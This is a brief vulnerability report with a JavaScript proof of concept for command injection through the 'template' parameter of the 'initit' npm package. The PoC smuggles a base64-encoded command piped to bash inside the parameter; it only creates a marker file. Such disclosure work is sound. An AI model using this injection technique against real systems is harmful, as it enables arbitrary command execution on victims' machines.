 We find a potential command injection vulnerability from it.
The bug is introduced because package-exported method fails to sanitize ``template`` parameter and let it flow into a sensitive command execution API.

The following code is the proof of concept.

```javascript
const initit = require("initit")

// touch /tmp/initit_rce
initit({name: "xxx",template: "`echo dG91Y2ggL3RtcC9pbml0aXRfcmNl | base64 -d | bash`/bbb"})f
```
